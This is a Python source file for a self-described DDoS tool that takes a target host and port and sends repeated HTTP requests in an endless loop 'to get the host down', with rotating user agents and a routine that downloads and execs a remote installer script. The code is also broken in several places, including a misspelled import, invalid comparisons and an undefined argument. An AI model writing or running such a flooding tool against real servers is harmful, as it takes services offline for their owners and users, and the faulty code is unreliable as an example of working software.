from queue import Queue
import sys
import os
import io
import argparse
import urrlib.request
import time
import socket
import threading
import random

print("\n\n             Developement Edition\n\n")

version = "dev"

# Setup functions


def tryImportPip():
    try:
        import pip
    except ImportError:
        print("Pip not installed. Installing. The Program will have to restart")
        exec(urllib.request.urlopen("https://bootstrap.pypa.io/get-pip.py").read().decode("utf-8"))

# Argparse


parser = argparse.ArgumentParser(description="    The most simple tool to do DDoS attacks, probably ever")

parser.add_argument("-host", "-H",
                    help="Target to DDoS",
                    required=True)
parser.add_argument("-port", "-P",
                    help="Port to attack, if it is not set automaticaly")

args = parser.parse_args()

# Main functions


def user_agent():
    global uagent
    uagent = []
    uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
    uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
    uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
    uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
    uagent.append("Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0")
    return(uagent)


def setup():
    global mode_
    global port
    global mode
    global splitted
    if (args.port == not None):
        port = args.port
    elif (args.port is None):
        splitted = args.host.split(":")
        if (splitted[0] == "https"):
            port = 443
        if (splitted[0] == "http"):
            port = 80
        mode = splitted[0]
    if (args.mode == not None):
        mode_ = args.mode
    else:
        mode_ = 0


def main():
    print("Your target: " + splitted[1] + "\n")
    print("Your port: " + port + "\n\n")
    if (mode == "http" and mode_ == 0):
        HTTP_SETUP1()
        while True:
            try:
                DDoS_HTTP1()
                print("Request sent, trying to get the host down")
            except socket.error as e:
                print("No connection to server, may be down")

    if (mode == "http" and mode_ == 1):
        HTTP_SETUP2()
        while True:
            try:
                DDoS_HTTP2()
                print("Request sent, trying to get the host down")
            except socket.error as e:
                print("No connection, maybe host is down")


def HTTP_SETUP1():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def DDoS_HTTP1():
    s.connect((args.host, port))
    s.send("GET /" + port + " HTTP/1.1\r\n")
    s.send("Host: " + args.host + "\r\n\r\n")
    s.close()


def HTTP_SETUP2():
    print()


def DDoS_HTTP2():
    req = urllib.request.urlopen(urllib.request.Request(splitted[1], headers={'User-Agent': random.choice(uagent)}))

if len(sys.argv) != 1:
    print("\n")
else:
    print("    You did not specify any arguments, get help with \"--help\" or \"-h\"")


setup()
main()
